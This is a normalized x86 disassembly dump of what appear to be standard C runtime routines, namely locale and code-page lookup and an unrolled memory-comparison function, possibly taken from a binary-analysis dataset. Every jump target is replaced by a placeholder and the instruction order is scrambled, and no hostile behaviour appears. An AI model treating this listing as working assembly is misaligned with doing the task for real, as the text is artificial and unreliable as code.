pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_10024250
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_1002436d
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_10024665
push [ esi ]
call sub_1001cbb0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_10024250
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_1002453e
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_100246a1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1001e316
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_10024114
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_10024176
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_1001cbb0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_1002426b
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_10024665
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_10024114
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_100245fe
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_10024665
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_100245fe
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_1001daf3
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001ea23
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_1001da75
add esp 0x10
sub_10024892
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_10025d66 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
